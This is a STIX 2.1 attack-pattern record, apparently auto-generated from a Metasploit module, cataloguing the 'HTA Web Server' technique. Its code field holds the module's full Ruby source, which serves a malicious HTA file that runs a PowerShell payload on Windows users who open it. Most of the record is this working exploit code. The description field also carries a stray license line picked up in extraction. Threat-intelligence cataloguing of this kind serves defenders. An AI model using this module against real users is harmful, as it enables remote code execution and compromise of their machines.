{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a64e40ee-6e4d-4ed4-9905-c0d818305984",
    "created": "2024-08-14T16:46:01.776622Z",
    "modified": "2024-08-14T16:46:01.776626Z",
    "name": "HTA Web Server",
    "description": "( This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell. When a user navigates to the HTA file they will be prompted by IE twice before the payload is executed. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hta_server.rb",
            "external_id": "hta_server.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustedsec.com/july-2015/malicious-htas/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTA Web Server',\n      'Description'    => %q(\n        This module hosts an HTML Application (HTA) that when opened will run a\n        payload via Powershell. When a user navigates to the HTA file they will\n        be prompted by IE twice before the payload is executed.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => 'Spencer McIntyre',\n      'References'     =>\n        [\n          ['URL', 'https://www.trustedsec.com/july-2015/malicious-htas/']\n        ],\n      # space is restricted by the powershell command limit\n      'Payload'        => { 'DisableNops' => true, 'Space' => 2048 },\n      'Platform'       => %w(win),\n      'Targets'        =>\n        [\n          [ 'Powershell x86', { 'Platform' => 'win', 'Arch' => ARCH_X86 } ],\n          [ 'Powershell x64', { 'Platform' => 'win', 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-10-06',\n      'Notes'          =>\n        {\n          'SideEffects' => [ SCREEN_EFFECTS ],\n          'Stability'   => [ CRASH_SAFE ],\n        },\n    ))\n  end\n\n  def on_request_uri(cli, _request)\n    print_status('Delivering Payload')\n    p = regenerate_payload(cli)\n    data = Msf::Util::EXE.to_executable_fmt(\n      framework,\n      target.arch,\n      target.platform,\n      p.encoded,\n      'hta-psh',\n      { :arch => target.arch, :platform => target.platform }\n    )\n    send_response(cli, data, 'Content-Type' => 'application/hta')\n  end\n\n  def random_uri\n    # uri needs to end in .hta for IE to process the file correctly\n    '/' + Rex::Text.rand_text_alphanumeric(rand(10) + 6) + '.hta'\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-06",
    "x_mitre_platforms": [
        "%w(win)"
    ]
}